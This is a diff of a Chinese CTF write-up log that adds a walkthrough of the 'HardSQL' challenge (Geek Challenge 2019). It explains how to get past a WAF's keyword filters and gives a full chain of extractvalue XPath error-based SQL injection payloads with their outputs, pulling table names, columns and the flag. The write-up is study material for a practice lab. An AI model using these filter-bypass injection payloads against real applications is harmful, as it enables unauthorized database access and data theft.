@@ -201,7 +201,7 @@ Accept-Language: zh-CN,zh;q=0.9
 Cookie: UM_distinctid=17a52dafb251c-0133abcdf6c6a9-6373264-384000-17a52dafb261436
 Connection: close
 ```
-## 2021/07/06
+## 2021/07/05
 
 ### Upload
 
@@ -345,7 +345,7 @@ echo serialize($name);
 // O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}
 ```
 
-## 2021/07/07
+## 2021/07/06
 
 ### Upload
 
@@ -636,5 +636,33 @@ Cookie: UM_distinctid=17a7701d69cded-0a36b994c25fd8-6373264-384000-17a7701d69d9e
 Connection: close
 
 welcome to the zjctf
+```
+
+## 2021/07/07
+
+### HardSQL
+
+> 极客大挑战 2019
+
+#### 题目
+
+题目已经明示了**SQL注入**，直接开始试，发现存在waf，先试试过滤了哪些字符，包括`and or | & union space hex ascii`等一些常见的函数和符号，但是有几个符号没有被过滤，包括`^ ()`，分别用来取代`and or`和`space`，而`union`被过滤，我们需要另外一种方式进行注入，当我们输入一些错误信息时，会有回显，代表这道题目不太可能是**盲注**，通过测试发现报错注入的`extractvalue`和`updatexml`两个函数并没有被过滤，这道题我们可以采用这种方法，进行注入，先试试`?username=bme&password=1'^extractvalue(1,concat(0x7e,database()))%23`，发现有回显`XPATH syntax error: '~geek'`，说明思路是正确的，接下来继续注入就行，值得注意的是**Xpath报错注入是有位数上限**的，需要借助`right`和`left`函数，显示出完整的flag
+
+#### payload
+
+```
+// username=bme
+password=1'^extractvalue(1,concat(0x7e,database()))%23
+// XPATH syntax error: '~geek'
+password=1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))%23
+// XPATH syntax error: '~H4rDsq1'
+password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23
+// XPATH syntax error: '~id,username,password'
+password=1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23
+// XPATH syntax error: '~flag{7d35b909-3de4-4ead-917f-50'
+password=1'^extractvalue(1,(select(left(password,40))from(H4rDsq1)))%23
+// XPATH syntax error: '{7d35b909-3de4-4ead-917f-5023f5f'
+password=1'^extractvalue(1,(select(right(password,30))from(H4rDsq1)))%23
+// XPATH syntax error: 'de4-4ead-917f-5023f5f3f8e3}'
 ```
 
